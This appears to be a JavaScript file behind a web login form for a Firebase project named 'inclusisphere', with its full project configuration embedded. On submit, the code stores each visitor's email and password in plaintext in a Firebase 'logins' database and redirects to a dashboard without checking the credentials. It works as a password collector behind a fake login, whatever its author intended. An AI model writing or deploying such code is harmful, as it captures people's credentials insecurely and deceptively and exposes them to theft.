// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyBuzymeZYu59a917I2klJTO-32k3Pi-Pbo",
  authDomain: "inclusisphere-49199.firebaseapp.com",
  databaseURL: "https://inclusisphere-49199-default-rtdb.firebaseio.com",
  projectId: "inclusisphere-49199",
  storageBucket: "inclusisphere-49199.firebasestorage.app",
  messagingSenderId: "103984352021",
  appId: "1:103984352021:web:6d363a79dd790d0e52f71c",
  measurementId: "G-CKNSDT1ZGB"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Reference the database
const loginDB = firebase.database().ref("logins");

// Get DOM elements
const loginForm = document.getElementById("loginForm");

// Form submit handler
loginForm.addEventListener("submit", (e) => {
  e.preventDefault();

  const email = getElementVal("email");
  const password = getElementVal("password");

  // Save login attempt in Firebase
  saveLogin(email, password);

  // Reset form
  loginForm.reset();

  // Redirect to the dashboard page
  window.location.href = 'dash.html';
});

// Save login data to Firebase Realtime DB
const saveLogin = (email, password) => {
  const newLogin = loginDB.push();
  newLogin.set({
    email: email,
    password: password,
    timestamp: new Date().toISOString()
  });
};

// Helper function to get field values
const getElementVal = (id) => {
  return document.getElementById(id).value;
};